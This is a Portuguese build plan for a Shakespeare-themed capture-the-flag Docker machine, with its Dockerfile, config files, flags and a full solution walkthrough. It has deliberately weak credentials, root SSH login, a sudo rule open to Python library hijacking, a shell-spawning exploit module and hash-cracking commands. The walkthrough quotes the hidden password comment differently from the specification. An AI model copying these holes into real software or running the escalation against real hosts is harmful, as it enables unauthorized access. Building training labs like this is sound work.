# PLANO DE IMPLEMENTAÇÃO: CTF "THE GLOBE THEATER" (SHAKESPEARE PENTEST)

### 1. Classificação e Trilha
* **Trilha:** From scratch (user).
* **Justificativa:** O repositório e diretório de trabalho estão vazios (verified: powershell Get-ChildItem) e o ambiente será construído do zero (user).
* **Objetivo Final:** Disponibilizar um ambiente Docker vulnerável, reprodutível com `docker compose up -d`, contendo duas flags em formato `TAC{...}` obtidas exclusivamente por exploração de rede em três etapas temáticas Shakespearianas (user).

---

### 2. Escopo e Não-Objetivos
* **No Escopo:**
  * Imagem Docker compilada obrigatoriamente para a plataforma `linux/amd64` (user).
  * Serviço Web Nginx na porta 80 exibindo arte temático sobre a peça Hamlet e a frase "To be or not to be" (user).
  * Rota oculta `/archive` listável em dicionários padrão como `common.txt` (user).
  * Arquivo `/var/www/html/archive/hamlet.txt` contextualizando a peça Hamlet e arquivo `index.html` contendo a senha SSH codificada em Base64 comentada dentro do HTML.
  * Serviço OpenSSH na porta 22 permitindo autenticação do usuário `hamlet` com a senha descoberta (user).
  * Escalação lateral de `hamlet` para `othello` via comando `sudo` executando script Python vulnerável a sequestro de biblioteca local (*Python Library Hijacking*) (user).
  * User flag em `/home/othello/user.txt` no formato `TAC{...}` (user).
  * Arquivo `/home/othello/recado_de_iago.txt` contendo hash SHA-256 (user).
  * Escalação de privilégios para `root` através da quebra do hash com a wordlist `rockyou.txt`, revelando a senha de `root` para o comando `su` (user).
  * Root flag em `/root/root.txt` no formato `TAC{...}` (user).
  * Arquivos de orquestração: `Dockerfile`, `docker-compose.yml` (desenvolvimento/build) e `docker-compose-dist.yml` (distribuição com diretiva `image:`) (user).
  * Ficha de divulgação do desafio e relatório técnico com walkthrough completo (user).
* **Fora do Escopo (Não-Objetivos):**
  * Containers com modo privilegiado (`privileged: true`), montagem de socket Docker ou montagens de diretórios do host (user).
  * Uso de `network_mode: host` ou adição de capacidades extras de kernel (user).
  * Códigos com comunicação com a internet ou dependências dinâmicas externas durante a execução (user).
  * Mecanismos que dependam de força bruta impraticável ou adivinhações sem pistas no ambiente (user).

---

### 3. Mapeamento de Riscos e Adaptações (Landmines & Adaptations)
* **Risco 1: Conflito de portas de rede (80 e 22) com serviços ativos na máquina do avaliador.**
  * *Adaptação:* Mapeamento de portas no host fixado em `8080:80` (HTTP) e `2222:22` (SSH), mantendo as portas padrão no interior do container [assumed: portas 8080 e 2222 livres no host — if wrong: remapear portas no docker-compose].
* **Risco 2: Penalização por força bruta impraticável no hash SHA-256 ou na rota web (user).**
  * *Adaptação:* A rota web utilizada é `/archive`, presente na lista básica `common.txt` do SecLists [assumed: rota /archive presente no common.txt — if wrong: criar dica sutil no HTML principal]. A senha de root é `desdemona`, cuja quebra do hash SHA-256 (`31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205`, verified: powershell) ocorre instantaneamente nas primeiras linhas da `rockyou.txt` (user).
* **Risco 3: Falha na execução simultânea de múltiplos daemons (SSH e Nginx) sem systemd.**
  * *Adaptação:* Utilização do gerenciador de processos leve `supervisord` como processo inicial (`ENTRYPOINT`/`CMD`) em imagem base Debian [assumed: supervisord como init process — if wrong: script entrypoint shell].
* **Risco 4: Incompatibilidade entre plataformas em máquinas Mac Apple Silicon e Linux x86_64 (user).**
  * *Adaptação:* Fixação de `--platform=linux/amd64` no `Dockerfile` e compilação documentada com `docker buildx` (user).

---

### 4. Assumptions Ledger (Decisões Padronizadas)
* [assumed: Imagem base oficial `debian:bookworm-slim` — if wrong: `ubuntu:22.04`].
* [assumed: Mapeamento de portas expostas no host `8080:80` e `2222:22` — if wrong: mapeamento direto `80:80` e `22:22`].
* [assumed: Rota web `/archive` contendo `hamlet.txt` e `index.html` — if wrong: rota `/secret`].
* [assumed: Senha SSH de hamlet configurada como `To_Be_Or_Not_To_Be_1603` — if wrong: alterar credencial].
* [assumed: Regra de sudoers `hamlet ALL=(othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py` — if wrong: permissão de sudo direta].
* [assumed: Vetor de movimento lateral é Python Library Hijacking importando módulo local `desdemona` a partir do diretório de execução — if wrong: argumento com eval ou os.system].
* [assumed: Valor da user flag é `TAC{h4ml3t_m33ts_0th3ll0_1603}` — if wrong: alterar string da flag].
* [assumed: Senha da conta root é `desdemona` com hash SHA-256 `31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205` (verified: powershell) — if wrong: alterar senha e hash].
* [assumed: Valor da root flag é `TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}` — if wrong: alterar string da flag].
* [assumed: Tag da imagem Docker publicada como `nomedogrupo/the-globe-theater:1.0` — if wrong: substituir pelo namespace real do Docker Hub do grupo].

---

### 5. Arquitetura e Estrutura de Arquivos

```
ctf/
├── Dockerfile
├── docker-compose.yml              # Versão para desenvolvimento local e build
├── docker-compose-dist.yml         # Versão para distribuição aos outros grupos (apenas image:)
├── README.md                       # Relatório técnico, instruções e walkthrough
├── FICHA.md                        # Ficha de apresentação para divulgação
└── src/
    ├── supervisord.conf            # Configuração do init process
    ├── web/
    │   ├── index.html              # Página inicial com "To be or not to be" e imagem temática
    │   ├── skull.svg               # Gráfico vetorial do crânio de Yorick
    │   └── archive/
    │       ├── index.html          # Página com comentário oculto contendo a senha SSH
    │       └── hamlet.txt          # Texto temático referenciando a tragédia de Hamlet
    └── scripts/
        └── theater.py              # Script executado via sudo vulnerável a hijacking
```

---

### 6. Especificação Técnica dos Artefatos

#### 6.1 `src/supervisord.conf`
```ini
[supervisord]
nodaemon=true
user=root
logfile=/var/log/supervisor/supervisord.log
pidfile=/var/run/supervisord.pid

[program:sshd]
command=/usr/sbin/sshd -D
autostart=true
autorestart=true

[program:nginx]
command=/usr/sbin/nginx -g "daemon off;"
autostart=true
autorestart=true
```

#### 6.2 `src/web/index.html` e `src/web/skull.svg`
* O `index.html` exibe visual escuro (teatro barroco), título "The Globe Theater", o crânio de Yorick (`skull.svg`) e a frase central: *"To be, or not to be, that is the question"* [assumed: HTML sem dependências de CDN externa — if wrong: usar assets locais adicionais].

#### 6.3 `src/web/archive/index.html` e `src/web/archive/hamlet.txt`
* `src/web/archive/hamlet.txt`: Contém notas sobre a tragédia shakespeariana de Hamlet, sem mencionar a palavra "ator principal", permitindo ao atacante deduzir a conta `hamlet` (user):
  ```text
  The Tragedy of Hamlet, Prince of Denmark.
  "There are more things in heaven and earth, Horatio,
  Than are dreamt of in your philosophy."
  ```
* `src/web/archive/index.html`: Contém a página do acervo teatral e, no código-fonte, a senha codificada em Base64 (user):
  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head><meta charset="UTF-8"><title>Archive - The Globe</title></head>
  <body style="background:#111; color:#eee; font-family:serif; text-align:center; padding:50px;">
    <h1>Royal Archives</h1>
    <p>Manuscripts and historical records of the Danish court.</p>
    <!--[ARCHIVE RECORD: MS-ELSN-1603-BK1]
  [FOLIO FRAGMENT: RESTRICTED MANUSCRIPT - RESTORATION INCOMPLETE]
  ------------------------------------------------------------------------
  ...to be/ or not to be- that is the queftion/
  whether tis nobler in the minde to fuffer
  the flings and arrowes of outragious fortune/
  or to take Armes againft a Sea of troubles/
  and by oppofing end them...

  [LACUNA NOTED IN MARGIN: FOLIO DEFACED]

  ...to dye/ to fleepe- no more; and by a fleepe to faye we end
  the heart-ake/ and the thoufand naturall fhockes
  that Flefh is heire to/ tis a confummation
  deuoutly to be wifh'd...
  ------------------------------------------------------------------------
  [TRANSCRIPTER NOTE: ATTRIBUTED TO PRINCE OF DENMARK (H. RECORD)]
  [END OF RECORD] 
  VG9fQmVfT3JfTm90X1RvX0JlXzE2MDM=-->
  </body>
  </html>
  ```

#### 6.4 `src/scripts/theater.py`
```python
#!/usr/bin/env python3
import sys
import os

# Adiciona o diretorio atual de execucao ao sys.path para permitir modulos locais da peca
sys.path.insert(0, os.getcwd())

# Othello's play verification engine
try:
    import desdemona
    desdemona.verificar_fidelidade()
except ImportError:
    print("[*] Erro no teatro: modulo 'desdemona' ausente. Verifique o cenario.")
    sys.exit(1)
```
* Propriedade: `othello:othello`, permissões `0755` [assumed].

#### 6.5 Configuração de Contas e Permissões no `Dockerfile`
* Usuário `hamlet`: senha `To_Be_Or_Not_To_Be_1603`, home `/home/hamlet`, shell `/bin/bash` [assumed].
* Usuário `othello`: senha travada/aleatória, home `/home/othello`, shell `/bin/bash` [assumed].
* Usuário `root`: senha `desdemona` [assumed].
* Arquivo `/etc/sudoers.d/hamlet` com permissão `0440`:
  `hamlet ALL=(othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py` [assumed].
* Flag de usuário `/home/othello/user.txt`: permissão `0640`, proprietário `othello:othello`, valor `TAC{h4ml3t_m33ts_0th3ll0_1603}` [assumed].
* Arquivo `/home/othello/recado_de_iago.txt`: permissão `0644`, proprietário `othello:othello`, conteúdo:
  `Otelo, a lealdade da corte foi maculada. O segredo da coroa está guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205` (verified: powershell).
* Flag de root `/root/root.txt`: permissão `0600`, proprietário `root:root`, valor `TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}` [assumed].

#### 6.6 `Dockerfile`
```dockerfile
FROM --platform=linux/amd64 debian:bookworm-slim

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    nginx \
    openssh-server \
    python3 \
    sudo \
    supervisor \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Configuracao do OpenSSH
RUN mkdir -p /var/run/sshd /var/log/supervisor /opt/scripts /var/www/html/archive
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config \
    && sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Criacao dos usuarios e senhas
RUN useradd -m -s /bin/bash hamlet \
    && echo "hamlet:To_Be_Or_Not_To_Be_1603" | chpasswd
RUN useradd -m -s /bin/bash othello \
    && echo "othello:Oth3ll0_V3n1c3_Lock3d" | chpasswd
RUN echo "root:desdemona" | chpasswd

# Sudoers
RUN echo "hamlet ALL=(othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py" > /etc/sudoers.d/hamlet \
    && chmod 0440 /etc/sudoers.d/hamlet

# Flags e arquivos tematicos
RUN echo "TAC{h4ml3t_m33ts_0th3ll0_1603}" > /home/othello/user.txt \
    && chown othello:othello /home/othello/user.txt \
    && chmod 0640 /home/othello/user.txt

RUN echo "Otelo, a lealdade da corte foi maculada. O segredo da coroa esta guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205" > /home/othello/recado_de_iago.txt \
    && chown othello:othello /home/othello/recado_de_iago.txt \
    && chmod 0644 /home/othello/recado_de_iago.txt

RUN echo "TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}" > /root/root.txt \
    && chown root:root /root/root.txt \
    && chmod 0600 /root/root.txt

# Copia de arquivos do projeto
COPY src/supervisord.conf /etc/supervisor/conf.d/supervisord.conf
COPY src/scripts/theater.py /opt/scripts/theater.py
RUN chmod 0755 /opt/scripts/theater.py && chown othello:othello /opt/scripts/theater.py

COPY src/web/ /var/www/html/
RUN chmod -R 0755 /var/www/html

EXPOSE 80 22

CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
```

#### 6.7 `docker-compose.yml` (Build / Desenvolvimento Local)
```yaml
services:
  the-globe-theater:
    build:
      context: .
      dockerfile: Dockerfile
    image: nomedogrupo/the-globe-theater:1.0
    container_name: the-globe-theater
    restart: unless-stopped
    ports:
      - "8080:80"
      - "2222:22"
```

#### 6.8 `docker-compose-dist.yml` (Distribuição para Outros Grupos)
```yaml
services:
  the-globe-theater:
    image: nomedogrupo/the-globe-theater:1.0
    container_name: the-globe-theater
    restart: unless-stopped
    ports:
      - "8080:80"
      - "2222:22"
```

---

### 7. Fases de Execução da Construção (Build Phases)

#### Fase 1: Inicialização do Workspace e Arquivos Base
* Criar a estrutura física de diretórios `src/web/archive` e `src/scripts`.
* Gerar o arquivo de configuração do supervisor `src/supervisord.conf`.
* Gerar os arquivos estáticos web (`index.html`, `skull.svg`, `archive/index.html` e `archive/hamlet.txt`).
* Gerar o script Python `src/scripts/theater.py`.

#### Fase 2: Configuração de Orquestração e Imagem
* Criar o `Dockerfile` com suporte à plataforma `linux/amd64`.
* Criar `docker-compose.yml` e `docker-compose-dist.yml`.
* Validar a compilação local da imagem com `docker compose build`.

#### Fase 3: Validação Funcional Local (Teste do Pentest)
* Subir o container com `docker compose up -d`.
* Executar enumeração de portas: verificar se portas 8080 e 2222 respondem.
* Testar requisição para `http://127.0.0.1:8080/archive/` e validar comentário com a senha.
* Efetuar login SSH com `hamlet:To_Be_Or_Not_To_Be_1603`.
* Executar o ataque de *Python Library Hijacking* e obter terminal como `othello`.
* Verificar leitura de `user.txt` e extrair a hash de `recado_de_iago.txt`.
* Quebrar a hash com `rockyou.txt`, executar `su -` com a senha `desdemona` e ler `/root/root.txt`.
* Encerrar o container com `docker compose down`.

#### Fase 4: Documentação e Publicação
* Gerar o arquivo `README.md` contendo a contextualização, instruções de execução, descrição formal das vulnerabilidades e walkthrough passo a passo.
* Gerar o arquivo `FICHA.md` contendo a ficha de divulgação sem spoilers da máquina.
* Documentar os comandos de publicação no Docker Hub (`docker tag` e `docker push`).

---

### 8. Ficha de Divulgação do Desafio (`FICHA.md`)
* **Nome do Desafio:** The Globe Theater
* **Sinopse:** Bem-vindo ao Globe Theater em Londres, ano de 1603. Os manuscritos das mais famosas tragédias shakespearianas estão guardados sob a guarda da coroa. Rumores de traição e intrigas rondam o castelo de Elsinore e as tropas de Veneza. Será você capaz de desvendar os segredos deixados entre os bastidores do palco, revelar as intrigas de Iago e assumir o controle definitivo do trono real?
* **Nível de Dificuldade Estimado:** Fácil / Médio (user).
* **Número de Flags e Formato:** 2 flags obrigatórias (`user flag` e `root flag`) no formato `TAC{...}` (user).
* **Execução do Desafio:**
  ```bash
  docker compose -f docker-compose-dist.yml up -d
  ```
* **Portas Expostas:** `8080` (HTTP) e `2222` (SSH) [assumed].

---

### 9. Walkthrough Técnico da Solução

1. **Enumeração de Rede:**
   ```bash
   nmap -sV -p 8080,2222 127.0.0.1
   ```
   *Identifica Nginx rodando na 8080 e OpenSSH na 2222.*

2. **Enumeração Web e Descoberta de Credenciais:**
   ```bash
   gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
   ```
   *Identifica a rota `/archive`.*
   *Navega até `http://127.0.0.1:8080/archive/`.*
   *Acessa o código-fonte da página (`Ctrl+U`) e identifica o comentário:*
   `<!-- Senha de acesso: To_Be_Or_Not_To_Be_1603 -->`.
   *Lê o arquivo `http://127.0.0.1:8080/archive/hamlet.txt` e deduz o usuário `hamlet`.*

3. **Acesso Inicial (Usuário Hamlet):**
   ```bash
   ssh hamlet@127.0.0.1 -p 2222
   # Senha: To_Be_Or_Not_To_Be_1603
   ```

4. **Enumeração Local e Movimento Lateral (Usuário Othello):**
   ```bash
   sudo -l
   # Retorna: (othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py
   ```
   *Criação do módulo explorável em `/tmp`:*
   ```bash
   cd /tmp
   cat << 'EOF' > desdemona.py
   import pty, os
   def verificar_fidelidade():
       pty.spawn("/bin/bash")
   EOF
   ```
   *Execução do comando vulnerável:*
   ```bash
   sudo -u othello /usr/bin/python3 /opt/scripts/theater.py
   ```
   *Shell obtido como `othello`.*
   *Coleta da user flag:*
   ```bash
   cat /home/othello/user.txt
   # TAC{h4ml3t_m33ts_0th3ll0_1603}
   ```

5. **Escalação de Privilégios (Root):**
   ```bash
   cat /home/othello/recado_de_iago.txt
   # Retorna o hash: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205
   ```
   *Quebra da hash com john ou hashcat:*
   ```bash
   echo "31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205" > hash.txt
   john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   # Resultado instantaneo: desdemona
   ```
   *Elevação para root via `su`:*
   ```bash
   su -
   # Senha: desdemona
   ```
   *Coleta da root flag:*
   ```bash
   cat /root/root.txt
   # TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}
   ```

